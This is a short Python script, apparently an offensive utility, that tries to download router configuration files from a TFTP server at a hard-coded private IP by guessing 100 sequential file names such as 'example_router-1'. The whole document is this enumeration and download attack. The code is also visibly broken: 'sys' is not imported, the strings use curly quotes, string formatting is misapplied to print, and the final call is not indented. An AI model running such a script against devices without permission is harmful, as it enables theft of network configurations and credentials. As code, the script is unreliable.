#!/usr/bin/env python
#This script will connect to TFTP file sharing UDP port and try to download files named like example_router-1 and iterate up to 100
#We then check the sizes of the files after to see if any of them contained data. Use command: ls -lah
try:
    import tftpy
except:
    sys.exit(“[!] Install the package tftpy with: pip install tftpy”)


def main():
    ip = "192.168.195.165"
    port = 69
    tclient = tftpy.TftpClient(ip,port)
    for inc in range(0,100):
        filename = "example_router" + "-" + str(inc)
        print("[*] Attempting to download %s from %s:%s") % (filename,ip,port)
        try:
            tclient.download(filename,filename)
        except:
            print("[-] Failed to download %s from %s:%s") % (filename,ip,port)


if __name__ == '__main__':
main()